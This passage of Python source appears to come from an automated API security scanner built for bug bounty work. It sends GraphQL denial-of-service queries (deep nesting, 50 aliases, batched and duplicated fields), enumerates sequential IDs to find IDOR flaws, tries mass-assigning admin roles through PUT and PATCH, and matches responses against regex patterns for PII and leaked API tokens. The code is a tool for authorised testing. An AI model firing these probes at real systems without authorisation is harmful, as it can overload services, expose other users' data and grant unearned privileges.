                                evidence.append(f"Extracted {extracted_endpoints} API endpoints for testing")

                            findings.append(Finding(
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                name="Exposed API Documentation",
                                severity=severity,
                                description=description + " This reveals API structure and may expose "
                                           "internal endpoints, authentication methods, and data schemas.",
                                host=base_url,
                                endpoint=url,
                                evidence=evidence,
                                cvss_score=5.3 if severity == "MEDIUM" else 6.5,
                                cwe_id="CWE-200",
                                remediation="Restrict access to API documentation in production. "
                                           "Implement authentication for documentation endpoints. "
                                           "Remove sensitive information from public docs.",
                                references=[
                                    "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/"
                                ],
                                confidence_score=85 if severity == "MEDIUM" else 90,
                                metadata={
                                    "openapi_parsed": parsed_spec is not None,
                                    "endpoints_extracted": extracted_endpoints,
                                },
                            ).to_dict())
                            break

                except Exception as e:
                    logger.debug(f"Error checking {url}: {e}")

        return findings

    def get_openapi_endpoints(self, base_url: str) -> dict[str, Any]:
        """
        G-06 FIX: Get extracted endpoints from parsed OpenAPI spec.

        Call this after scan() to get endpoints for other scanners.
        """
        if hasattr(self, "_parsed_openapi_spec") and self._parsed_openapi_spec:
            return OpenAPIParser.to_asset_data(self._parsed_openapi_spec, base_url)
        return {}
    
    async def _check_graphql(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Check GraphQL endpoints for vulnerabilities.

        Enhanced with HIGH-VALUE DoS attacks:
        - Alias abuse (100x query multiplication)
        - Batch query attacks
        - Fragment bombing
        - Query complexity exploitation
        - Circular query detection
        """
        findings = []

        graphql_paths = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                        "/query", "/api/query", "/v2/graphql"]

        async with get_scan_client(timeout=30.0, verify_ssl=False, http2=True) as client:
            for path in graphql_paths:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)
                found_graphql = False

                try:
                    # Test introspection
                    response = await client.post(
                        url,
                        json={"query": self.GRAPHQL_INTROSPECTION},
                        headers={"Content-Type": "application/json"},
                        timeout=10.0,
                    )

                    if response.status_code == 200:
                        try:
                            data = response.json()

                            if isinstance(data, dict) and "data" in data and "__schema" in data.get("data", {}):
                                found_graphql = True
                                # Introspection enabled
                                schema = data["data"]["__schema"]
                                types_count = len(schema.get("types", []))

                                findings.append(Finding(
                                    vuln_type=VulnType.INFO_DISCLOSURE,
                                    name="GraphQL Introspection Enabled",
                                    severity=Severity.MEDIUM,
                                    description="GraphQL introspection is enabled, revealing the entire API schema. "
                                               "This exposes all types, queries, mutations, and their fields.",
                                    host=base_url,
                                    endpoint=url,
                                    evidence=[
                                        f"GraphQL endpoint: {url}",
                                        f"Schema types exposed: {types_count}",
                                    ],
                                    cvss_score=5.3,
                                    cwe_id="CWE-200",
                                    remediation="Disable introspection in production environments. "
                                               "Use allowlists for queries. Implement depth limiting.",
                                    references=[
                                        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
                                    ],
                                    confidence_score=85,
                                ).to_dict())

                                # Check for dangerous mutations
                                mutation_findings = self._analyze_graphql_schema(
                                    schema, url, base_url
                                )
                                findings.extend(mutation_findings)

                        except json.JSONDecodeError:
                            pass

                    # ================================================================
                    # HIGH VALUE: GraphQL DoS Attack Testing
                    # These can cause significant server load and are bounty-worthy
                    # ================================================================

                    # Test 1: Query Depth Attack
                    await rate_limiter.acquire()
                    depth_query = self._generate_deep_query()
                    depth_response = await client.post(
                        url,
                        json={"query": depth_query},
                        headers={"Content-Type": "application/json"},
                        timeout=10.0,  # Short timeout to detect if server struggles
                    )

                    if depth_response.status_code == 200:
                        found_graphql = True
                        findings.append(Finding(
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            name="GraphQL Missing Depth Limiting",
                            severity=Severity.MEDIUM,
                            description="GraphQL endpoint accepts deeply nested queries, "
                                       "potentially allowing DoS attacks through complex queries.",
                            host=base_url,
                            endpoint=url,
                            evidence=["Deep nested query was accepted"],
                            cvss_score=5.3,
                            cwe_id="CWE-400",
                            remediation="Implement query depth limiting. Set maximum query complexity. "
                                       "Use query cost analysis.",
                            confidence_score=85,
                        ).to_dict())

                    # Test 2: Alias Abuse Attack (Query Multiplication)
                    # This is a HIGH-VALUE DoS vector - $2k-$5k bounties
                    await rate_limiter.acquire()
                    alias_query = self._generate_alias_attack_query(50)  # 50 aliases
                    try:
                        start_time = time.time()
                        alias_response = await client.post(
                            url,
                            json={"query": alias_query},
                            headers={"Content-Type": "application/json"},
                            timeout=15.0,
                        )
                        response_time = time.time() - start_time

                        if alias_response.status_code == 200:
                            found_graphql = True
                            # Check if response time indicates server strain
                            severity = "HIGH" if response_time > 3.0 else "MEDIUM"

                            findings.append(Finding(
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                name="GraphQL Alias Abuse - Query Multiplication DoS",
                                severity=severity,
                                description=f"GraphQL endpoint accepts queries with many aliases, "
                                           f"allowing attackers to multiply query execution. "
                                           f"Response time: {response_time:.2f}s for 50 aliases. "
                                           f"An attacker could use 1000+ aliases to cause severe DoS.",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    "50 alias query accepted",
                                    f"Response time: {response_time:.2f}s",
                                    "Query multiplication attack possible",
                                ],
                                cvss_score=7.5 if severity == "HIGH" else 5.3,
                                cwe_id="CWE-400",
                                remediation="Implement alias limiting (max 10-20 per query). "
                                           "Add query cost analysis that counts aliases. "
                                           "Set per-query time limits.",
                                confidence_score=90,
                            ).to_dict())
                    except httpx.TimeoutException:
                        # Timeout indicates DoS potential!
                        findings.append(Finding(
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            name="GraphQL Alias Abuse DoS - Server Timeout",
                            severity=Severity.HIGH,
                            description="GraphQL server timed out processing alias abuse query. "
                                       "This confirms DoS vulnerability via query multiplication.",
                            host=base_url,
                            endpoint=url,
                            evidence=["Server timed out on 50-alias query"],
                            cvss_score=7.5,
                            cwe_id="CWE-400",
                            remediation="Implement query cost analysis and alias limiting.",
                            confidence_score=95,
                        ).to_dict())

                    # Test 3: Batch Query Attack
                    # Send multiple operations in single request
                    await rate_limiter.acquire()
                    batch_query = self._generate_batch_query(20)  # 20 queries
                    try:
                        start_time = time.time()
                        batch_response = await client.post(
                            url,
                            json=batch_query,  # Array of queries
                            headers={"Content-Type": "application/json"},
                            timeout=15.0,
                        )
                        response_time = time.time() - start_time

                        if batch_response.status_code == 200:
                            try:
                                batch_data = batch_response.json()
                                # If response is array, batching is supported
                                if isinstance(batch_data, list) and len(batch_data) > 1:
                                    findings.append(Finding(
                                        vuln_type=VulnType.INFO_DISCLOSURE,
                                        name="GraphQL Batch Query Attack",
                                        severity=Severity.MEDIUM,
                                        description=f"GraphQL endpoint accepts batch queries, "
                                                   f"allowing multiple operations per request. "
                                                   f"Attacker can bypass rate limiting and cause DoS. "
                                                   f"Executed {len(batch_data)} queries in {response_time:.2f}s.",
                                        host=base_url,
                                        endpoint=url,
                                        evidence=[
                                            f"Batch of {len(batch_data)} queries accepted",
                                            f"Response time: {response_time:.2f}s",
                                        ],
                                        cvss_score=5.3,
                                        cwe_id="CWE-400",
                                        remediation="Limit batch query count (max 5-10). "
                                                   "Apply rate limiting per operation, not per request.",
                                        confidence_score=90,
                                    ).to_dict())
                            except json.JSONDecodeError:
                                pass
                    except Exception as e:
                        logger.debug(f"Batch query test error: {e}")

                    # Test 4: Field Duplication Attack
                    await rate_limiter.acquire()
                    field_dup_query = self._generate_field_duplication_query(100)
                    try:
                        start_time = time.time()
                        dup_response = await client.post(
                            url,
                            json={"query": field_dup_query},
                            headers={"Content-Type": "application/json"},
                            timeout=10.0,
                        )
                        response_time = time.time() - start_time

                        if dup_response.status_code == 200 and response_time > 2.0:
                            findings.append(Finding(
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                name="GraphQL Field Duplication DoS",
                                severity=Severity.MEDIUM,
                                description=f"GraphQL accepts queries with duplicated fields. "
                                           f"Response time: {response_time:.2f}s indicates processing overhead.",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    "100 duplicate fields accepted",
                                    f"Response time: {response_time:.2f}s",
                                ],
                                cvss_score=5.3,
                                cwe_id="CWE-400",
                                remediation="Deduplicate fields in query validation. "
                                           "Implement query complexity limits.",
                                confidence_score=85,
                            ).to_dict())
                    except Exception:
                        pass

                except Exception as e:
                    logger.debug(f"GraphQL check failed for {url}: {e}")

        return findings

    def _generate_alias_attack_query(self, count: int = 50) -> str:
        """
        Generate GraphQL query with many aliases for DoS testing.

        Each alias executes the same query, multiplying server load.
        Example: {a0: __typename, a1: __typename, ..., a49: __typename}
        """
        aliases = [f"a{i}: __typename" for i in range(count)]
        return "query { " + " ".join(aliases) + " }"

    def _generate_batch_query(self, count: int = 20) -> list[dict]:
        """
        Generate batch GraphQL query (array of operations).

        Tests if server accepts multiple operations per request.
        """
        return [
            {"query": "query { __typename }", "operationName": None}
            for _ in range(count)
        ]

    def _generate_field_duplication_query(self, count: int = 100) -> str:
        """
        Generate query with many duplicate fields.

        Tests if server processes each duplicate separately.
        """
        fields = " ".join(["__typename"] * count)
        return f"query {{ {fields} }}"
    
    def _analyze_graphql_schema(
        self,
        schema: dict,
        url: str,
        base_url: str,
    ) -> list[dict[str, Any]]:
        """Analyze GraphQL schema for security issues."""
        findings = []
        
        dangerous_patterns = ["delete", "remove", "drop", "admin", "internal"]
        
        for type_def in schema.get("types", []):
            type_name = type_def.get("name", "").lower()
            
            # Skip built-in types
            if type_name.startswith("__"):
                continue
            
            for pattern in dangerous_patterns:
                if pattern in type_name:
                    findings.append(Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        name="Potentially Dangerous GraphQL Type Exposed",
                        severity=Severity.LOW,
                        description=f"GraphQL schema exposes type '{type_def.get('name')}' "
                                   f"which may be administrative or sensitive.",
                        host=base_url,
                        endpoint=url,
                        evidence=[f"Type name: {type_def.get('name')}"],
                        cvss_score=3.7,
                        cwe_id="CWE-200",
                        remediation="Review exposed types and restrict access to sensitive operations.",
                        confidence_score=80,
                    ).to_dict())
                    break
        
        return findings
    
    def _generate_deep_query(self) -> str:
        """Generate a deeply nested GraphQL query for testing."""
        return """
        query {
          __typename
          ... on Query {
            __typename
            ... on Query {
              __typename
              ... on Query {
                __typename
                ... on Query {
                  __typename
                }
              }
            }
          }
        }
        """
    
    async def _check_idor(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
        discovered_endpoints: list[str] | None = None,
    ) -> list[dict[str, Any]]:
        """
        Check for BOLA/IDOR vulnerabilities.

        IMPROVED: Uses EndpointMap for intelligent endpoint selection + fallback to hardcoded.
        Priority: EndpointMap USER_DATA/API_REST > discovered_endpoints > hardcoded patterns
        """
        findings = []
        exploitation_helper = ExploitationHelper()

        # Combine endpoints from multiple sources
        endpoints_to_test = []

        # PRIORITY 1: Get endpoints from EndpointMap (most reliable)
        endpoint_map = EndpointMap.get_instance()
        map_endpoints = []

        # Get USER_DATA and API_REST categories (most IDOR-relevant)
        for category in [EndpointCategory.USER_DATA, EndpointCategory.API_REST]:
            for ep in endpoint_map.get_by_category(category):
                if ep.verified or ep.confidence >= 0.7:
                    map_endpoints.append(ep.path)

        if map_endpoints:
            for path in map_endpoints:
                url = urljoin(base_url, path)
                endpoints_to_test.append(url)
                # Add with /{id} suffix if doesn't have one
                if not any(x in path for x in ["{id}", "/1", "/2", "/me"]):
                    endpoints_to_test.append(f"{url}/{{id}}")
            logger.info(f"[IDOR] Using {len(map_endpoints)} endpoints from EndpointMap")

        # PRIORITY 2: Add discovered API endpoints (e.g., /api/Users, /api/Feedbacks)
        if discovered_endpoints:
            for endpoint in discovered_endpoints:
                # Normalize endpoint
                if not endpoint.startswith("http"):
                    endpoint = urljoin(base_url, endpoint)
                if endpoint not in endpoints_to_test:
                    endpoints_to_test.append(endpoint)
                    # Also add with /{id} suffix for discovered endpoints
                    if not endpoint.endswith("/"):
                        id_endpoint = f"{endpoint}/{{id}}"
                        if id_endpoint not in endpoints_to_test:
                            endpoints_to_test.append(id_endpoint)

        # PRIORITY 3: Fallback to hardcoded patterns (only if no endpoints from map)
        if not map_endpoints:
            for pattern in self.IDOR_PATTERNS:
                endpoints_to_test.append(urljoin(base_url, pattern.replace("{id}", "{id}")))
            logger.info(f"[IDOR] Fallback to {len(self.IDOR_PATTERNS)} hardcoded patterns")
        else:
            logger.info(f"[IDOR] Testing {len(endpoints_to_test)} total endpoints")

        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            # Track 404s to avoid wasting requests on non-existent patterns
            consecutive_404s = 0
            max_consecutive_404s = 5  # Skip remaining hardcoded patterns after 5 consecutive 404s

            for endpoint_pattern in endpoints_to_test:
                await rate_limiter.acquire()

                # OPTIMIZATION: First check if endpoint exists with ID=1
                # Skip patterns that return 404 to avoid wasting requests
                probe_url = endpoint_pattern.replace("{id}", "1")
                try:
                    probe_response = await client.get(probe_url, timeout=10.0)
                    # Skip if endpoint doesn't exist (404) or bad request (400)
                    if probe_response.status_code in [404, 400]:
                        consecutive_404s += 1
                        # After too many 404s on hardcoded patterns, skip remaining
                        if consecutive_404s >= max_consecutive_404s and "{id}" in endpoint_pattern:
                            logger.debug(f"[IDOR] Skipping remaining hardcoded patterns after {consecutive_404s} 404s")
                            continue
                        continue
                    else:
                        consecutive_404s = 0  # Reset counter on success
                except Exception as e:
                    logger.debug(f"[IDOR] Endpoint check error for {endpoint_pattern}: {e}")
                    continue

                # Test with different IDs (only for endpoints that exist)
                test_ids = ["1", "2", "100", "999"]
                responses = []

                for test_id in test_ids:
                    url = endpoint_pattern.replace("{id}", test_id)

                    try:
                        response = await client.get(url, timeout=10.0)
                        response_data = None

                        # Try to parse JSON for better evidence
                        if "application/json" in response.headers.get("content-type", ""):
                            try:
                                response_data = response.json()
                            except Exception:
                                pass

                        responses.append({
                            "id": test_id,
                            "status": response.status_code,
                            "length": len(response.text),
                            "has_data": response_data is not None and len(str(response_data)) > 10,
                            "sample": response.text[:200] if response.status_code == 200 else "",
                        })
                    except Exception as e:
                        logger.debug(f"[IDOR] ID test error for {test_id}: {e}")
                        continue

                # Analyze responses for IDOR
                if len(responses) >= 2:
                    status_200_count = sum(1 for r in responses if r["status"] == 200)

                    if status_200_count >= 2:
                        # Multiple IDs return 200 - potential IDOR
                        lengths = [r["length"] for r in responses if r["status"] == 200]
                        has_data_responses = [r for r in responses if r.get("has_data")]

                        # Different content lengths = different user data = IDOR confirmed
                        if len(set(lengths)) > 1 or len(has_data_responses) >= 2:
                            # Get sample IDs for POC
                            successful_ids = [r["id"] for r in responses if r["status"] == 200]
                            id_1 = successful_ids[0] if successful_ids else "1"
                            id_2 = successful_ids[1] if len(successful_ids) > 1 else "2"

                            # Extract data type from endpoint
                            data_type = "user data"
                            endpoint_lower = endpoint_pattern.lower()
                            if "user" in endpoint_lower:
                                data_type = "user profiles"
                            elif "order" in endpoint_lower:
                                data_type = "order details"
                            elif "feedback" in endpoint_lower:
                                data_type = "user feedback"
                            elif "card" in endpoint_lower:
                                data_type = "payment cards"
                            elif "basket" in endpoint_lower:
                                data_type = "shopping carts"
                            elif "address" in endpoint_lower:
                                data_type = "addresses"

                            # Generate POC
                            poc = exploitation_helper.generate_idor_poc(
                                url=endpoint_pattern.replace("{id}", id_1),
                                original_id=id_1,
                                test_id=id_2,
                                id_parameter="id",
                                data_type=data_type,
                                response_evidence=responses[0].get("sample", "")[:300],
                                http_method="GET",
                            )

                            # Extract resource name from endpoint pattern
                            # e.g. /api/Recycles/{id} → "Recycles", /users/{id} → "users"
                            _path_parts = [p for p in endpoint_pattern.split("/") if p and p != "{id}"]
                            _resource_name = _path_parts[-1] if _path_parts else "resource"

                            findings.append(Finding(
                                vuln_type=VulnType.IDOR,
                                name=f"IDOR/BOLA in {_resource_name}",
                                severity=Severity.HIGH,
                                description=(
                                    f"Insecure Direct Object Reference (IDOR) vulnerability found. "
                                    f"Accessing {endpoint_pattern} with different IDs returns different {data_type} "
                                    f"without proper authorization checks. An attacker can enumerate and access "
                                    f"other users' data by changing the ID parameter."
                                ),
                                host=base_url,
                                endpoint=endpoint_pattern,
                                evidence=[
                                    f"Endpoint: {endpoint_pattern}",
                                    f"Test IDs: {successful_ids}",
                                    f"Response lengths: {lengths}",
                                    f"Data type exposed: {data_type}",
                                    f"Sample responses: {len([r for r in responses if r['status'] == 200])} with 200 OK",
                                ],
                                cvss_score=7.5,
                                cwe_id="CWE-639",
                                remediation=(
                                    "1. Implement proper authorization checks - verify user owns the resource\n"
                                    "2. Use indirect references or UUIDs instead of sequential IDs\n"
                                    "3. Add row-level security policies in the database\n"
                                    "4. Log and alert on suspicious enumeration patterns"
                                ),
                                references=[
                                    "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
                                ],
                                metadata={
                                    "poc": poc.to_dict(),
                                    "tested_ids": successful_ids,
                                    "data_type": data_type,
                                    "response_lengths": lengths,
                                },
                                confidence_score=90,
                            ).to_dict())

                            # Found IDOR on this endpoint, no need to test more IDs
                            break

        return findings
    
    # PII detection patterns (OWASP API3:2023 - Excessive Data Exposure)
    PII_PATTERNS = {
        "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
        "phone": re.compile(r"(\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}"),
        "ssn": re.compile(r"\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b"),
        "credit_card": re.compile(r"\b(?:\d{4}[-\s]?){3}\d{4}\b"),
        "ip_address": re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
        "jwt": re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"),
        "api_key": re.compile(r"(?:api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"']?([a-zA-Z0-9_-]{20,})", re.I),
        "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
        "private_key": re.compile(r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----"),
    }

    # Extended sensitive field names
    SENSITIVE_FIELD_NAMES = [
        # Credentials
        "password", "passwd", "pwd", "secret", "credential", "auth_token",
        "access_token", "refresh_token", "api_key", "apikey", "private_key",
        "secret_key", "encryption_key", "signing_key",
        # PII
        "ssn", "social_security", "national_id", "passport", "driver_license",
        "credit_card", "card_number", "cvv", "cvc", "expiry", "bank_account",
        "routing_number", "iban", "swift",
        # Internal/Debug
        "internal", "debug", "trace", "stack_trace", "error_details",
        "sql_query", "query", "connection_string", "database_url",
        # Hashes/Salts
        "hash", "salt", "digest", "checksum", "password_hash",
        # Session/Auth
        "session_id", "session_token", "csrf_token", "nonce",
        # Admin/Privilege
        "is_admin", "is_superuser", "role", "permissions", "privileges",
        "admin_notes", "internal_notes", "staff_notes",
        # Infrastructure
        "server_ip", "internal_ip", "private_ip", "hostname", "server_name",
        "aws_key", "aws_secret", "gcp_key", "azure_key",
    ]

    async def _check_data_exposure(
        self,
        base_url: str,
        api_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Check for excessive data exposure (OWASP API3:2023).

        Detects:
        - Sensitive field names in responses
        - PII patterns in response values (email, phone, SSN, credit card)
        - Excessive response size (too many fields returned)
        - Internal/debug information leakage
        - Credential/secret exposure
        """
        findings = []

        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for endpoint in api_endpoints[:self.max_endpoints_per_test]:
                await rate_limiter.acquire()

                try:
                    response = await client.get(endpoint, timeout=10.0)

                    if response.status_code == 200:
                        content_type = response.headers.get("content-type", "")

                        if "json" in content_type:
                            try:
                                data = response.json()

                                # Check 1: Sensitive field names
                                sensitive_fields = self._find_sensitive_fields(
                                    data, self.SENSITIVE_FIELD_NAMES
                                )

                                # Check 2: PII patterns in values
                                pii_findings = self._detect_pii_in_values(data)

                                # Check 3: Excessive response size
                                field_count = self._count_fields(data)
                                excessive_fields = field_count > 50

                                # Check 4: Debug/internal info leakage
                                debug_info = self._detect_debug_info(data)

                                # Determine severity based on findings
                                severity = "LOW"
                                evidence = []

                                if sensitive_fields:
                                    evidence.append(f"Sensitive fields exposed: {sensitive_fields[:10]}")
                                    severity = "MEDIUM"

                                if pii_findings:
                                    evidence.append(f"PII detected: {list(pii_findings.keys())}")
                                    severity = "HIGH"  # PII exposure is HIGH

                                if excessive_fields:
                                    evidence.append(f"Excessive fields: {field_count} fields returned")
                                    if severity == "LOW":
                                        severity = "MEDIUM"

                                if debug_info:
                                    evidence.append(f"Debug/internal info: {debug_info[:5]}")
                                    severity = "HIGH"  # Debug info is HIGH risk

                                if evidence:
                                    # Calculate CVSS based on severity
                                    cvss = {"LOW": 3.7, "MEDIUM": 5.3, "HIGH": 7.5}.get(severity, 5.3)

                                    findings.append(Finding(
                                        vuln_type=VulnType.EXCESSIVE_DATA_EXPOSURE,
                                        name="Excessive Data Exposure",
                                        severity=severity,
                                        description="API response exposes sensitive data that may "
                                                   "leak PII, credentials, or internal information. "
                                                   "This violates OWASP API3:2023.",
                                        host=base_url,
                                        endpoint=endpoint,
                                        evidence=evidence,
                                        cvss_score=cvss,
                                        cwe_id="CWE-200",
                                        remediation=(
                                            "1. Implement response filtering to return only "
                                            "necessary fields.\n"
                                            "2. Use DTOs (Data Transfer Objects) to control "
                                            "what data is serialized.\n"
                                            "3. Apply field-level access control based on user roles.\n"
                                            "4. Never expose internal/debug data in production.\n"
                                            "5. Mask or redact PII in API responses."
                                        ),
                                        references=[
                                            "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"
                                        ],
                                        confidence_score=90.0 if pii_findings else 85.0,
                                        metadata={
                                            "sensitive_fields": sensitive_fields[:20],
                                            "pii_types": list(pii_findings.keys()) if pii_findings else [],
                                            "field_count": field_count,
                                            "has_debug_info": bool(debug_info),
                                        }
                                    ).to_dict())

                            except json.JSONDecodeError:
                                pass

                except Exception as e:
                    logger.debug(f"Data exposure check failed: {e}")

        return findings

    def _detect_pii_in_values(self, data: Any, path: str = "") -> dict[str, list[str]]:
        """Detect PII patterns in JSON values."""
        found = {}

        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                # Recursively check nested objects
                nested = self._detect_pii_in_values(value, current_path)
                for pii_type, paths in nested.items():
                    found.setdefault(pii_type, []).extend(paths)

        elif isinstance(data, list):
            for i, item in enumerate(data[:10]):  # Limit list iteration
                nested = self._detect_pii_in_values(item, f"{path}[{i}]")
                for pii_type, paths in nested.items():
                    found.setdefault(pii_type, []).extend(paths)

        elif isinstance(data, str) and len(data) > 5:
            # Check string values against PII patterns
            for pii_type, pattern in self.PII_PATTERNS.items():
                if pattern.search(data):
                    found.setdefault(pii_type, []).append(path)

        return found

    def _count_fields(self, data: Any, max_depth: int = 10) -> int:
        """Count total fields in JSON response."""
        if max_depth <= 0:
            return 0

        if isinstance(data, dict):
            count = len(data)
            for value in data.values():
                count += self._count_fields(value, max_depth - 1)
            return count
        elif isinstance(data, list) and data:
            # Sample first item for lists
            return self._count_fields(data[0], max_depth - 1) * min(len(data), 10)
        return 0

    def _detect_debug_info(self, data: Any, path: str = "") -> list[str]:
        """Detect debug/internal information leakage."""
        debug_indicators = []

        debug_keywords = [
            "stack_trace", "stacktrace", "traceback", "exception",
            "debug", "internal_error", "sql_query", "query_log",
            "server_info", "environment", "config", "settings",
            "__debug__", "_internal", "_private", "development",
        ]

        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                key_lower = key.lower()

                # Check key names
                if any(kw in key_lower for kw in debug_keywords):
                    debug_indicators.append(current_path)

                # Check string values for stack traces
                if isinstance(value, str):
                    if "at line" in value.lower() or "traceback" in value.lower():
                        debug_indicators.append(f"{current_path} (stack trace)")
                    elif value.startswith("/") and "." in value:
                        # Looks like a file path
                        debug_indicators.append(f"{current_path} (file path)")

                # Recurse
                debug_indicators.extend(self._detect_debug_info(value, current_path))

        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                debug_indicators.extend(self._detect_debug_info(item, f"{path}[{i}]"))

        return debug_indicators
    
    def _find_sensitive_fields(
        self,
        data: Any,
        sensitive_fields: list[str],
        path: str = "",
    ) -> list[str]:
        """Recursively find sensitive fields in JSON data."""
        found = []

        if isinstance(data, dict):  # Fixed: was 'asset_data' (bug)
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key

                if any(s in key.lower() for s in sensitive_fields):
                    found.append(current_path)

                found.extend(self._find_sensitive_fields(value, sensitive_fields, current_path))

        elif isinstance(data, list):
            for i, item in enumerate(data[:10]):  # Increased from 5 to 10
                found.extend(self._find_sensitive_fields(item, sensitive_fields, f"{path}[{i}]"))

        return found
    
    async def _check_rate_limiting(
        self,
        base_url: str,
        api_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Check for missing rate limiting."""
        findings = []
        
        if not api_endpoints:
            api_endpoints = [urljoin(base_url, "/api")]
        
        test_endpoint = api_endpoints[0]
        
        try:
            async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
                # Send rapid requests
                responses = []
                
                for i in range(20):
                    try:
                        response = await client.get(test_endpoint, timeout=10.0)
                        responses.append(response.status_code)
                    except Exception as e:
                        logger.debug(f"[API] Rate limit test request {i} failed: {e}")
                        break
                
                # Check if we got rate limited
                rate_limited = any(r == 429 for r in responses)
                
                if not rate_limited and len(responses) >= 20:
                    findings.append(Finding(
                        vuln_type=VulnType.RATE_LIMIT_BYPASS,
                        name="Missing API Rate Limiting",
                        severity=Severity.MEDIUM,
                        description="API endpoint does not implement rate limiting. "
                                   "This could allow denial of service or brute force attacks.",
                        host=base_url,
                        endpoint=test_endpoint,
                        evidence=[
                            f"Sent {len(responses)} rapid requests",
                            "No 429 (Too Many Requests) responses received",
                        ],
                        cvss_score=5.3,
                        cwe_id="CWE-770",
                        remediation="Implement rate limiting on all API endpoints. "
                                   "Use token bucket or sliding window algorithms. "
                                   "Return 429 status with Retry-After header.",
                        references=[
                            "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
                        ],
                        confidence_score=85,
                    ).to_dict())
                    
        except Exception as e:
            logger.debug(f"Rate limit check failed: {e}")
        
        return findings
    
    async def _check_mass_assignment(
        self,
        base_url: str,
        api_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Check for mass assignment vulnerabilities."""
        findings = []
        
        # This is a heuristic check - actual testing requires authentication
        dangerous_fields = ["role", "admin", "is_admin", "isAdmin", "permissions", "privilege"]
        
        # Look for user/account related endpoints
        user_endpoints = [
            "/api/user",
            "/api/users",
            "/api/account",
            "/api/profile",
            "/api/me",
        ]
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for path in user_endpoints:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)

                try:
                    # OPTIMIZATION: First check if endpoint exists with GET
                    probe_response = await client.get(url, timeout=10.0)
                    # Skip if endpoint doesn't exist (404/400/405 for GET is OK, but 404 means skip)
                    if probe_response.status_code == 404:
                        continue

                    # Try PUT/PATCH with dangerous fields
                    test_data = {
                        "name": "test",
                        "role": "admin",
                        "is_admin": True,
                        "permissions": ["admin", "write", "delete"],
                    }

                    for method in [client.put, client.patch]:
                        response = await method(
                            url,
                            json=test_data,
                            headers={"Content-Type": "application/json"},
                        )

                        # Skip if endpoint returns 404 for this method too
                        if response.status_code == 404:
                            continue

                        # If we get 200/201, the endpoint accepts these fields
                        if response.status_code in [200, 201]:
                            findings.append(Finding(
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                name="Potential Mass Assignment Vulnerability",
                                severity=Severity.HIGH,
                                description=f"API endpoint {path} accepts PUT/PATCH requests with "
                                           f"potentially dangerous fields (role, is_admin, permissions). "
                                           f"This may allow privilege escalation.",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    f"Endpoint: {url}",
                                    f"Method: {method.__name__.upper()}",
                                    f"Dangerous fields accepted: {list(test_data.keys())}",
                                ],
                                cvss_score=8.1,
                                cwe_id="CWE-915",
                                remediation="Implement allowlists for updatable fields. "
                                           "Use DTOs/schemas to control which properties can be modified. "
                                           "Never trust client-provided role or permission fields.",
                                references=[
                                    "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"
                                ],
                                confidence_score=85,
                            ).to_dict())
                            break

                except Exception as e:
                    logger.debug(f"Mass assignment check failed: {e}")
        
        return findings
    
    async def _check_api_key_exposure(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Check for exposed API keys in responses and JavaScript."""
        findings = []
        
        api_key_patterns = [
            (r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']', "Generic API Key"),
            (r'AIza[0-9A-Za-z_-]{35}', "Google API Key"),
            (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID"),
            (r'sk_live_[0-9a-zA-Z]{24}', "Stripe Secret Key"),
            (r'sk_test_[0-9a-zA-Z]{24}', "Stripe Test Key"),
            (r'sq0atp-[0-9A-Za-z_-]{22}', "Square Access Token"),
            (r'ghp_[0-9a-zA-Z]{36}', "GitHub Personal Access Token"),
            (r'xox[baprs]-[0-9a-zA-Z-]{10,}', "Slack Token"),
        ]
        
        await rate_limiter.acquire()
        
        # Check main page
        try:
            async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
                response = await client.get(base_url, timeout=10.0)
                content = response.text
                
                for pattern, key_type in api_key_patterns:
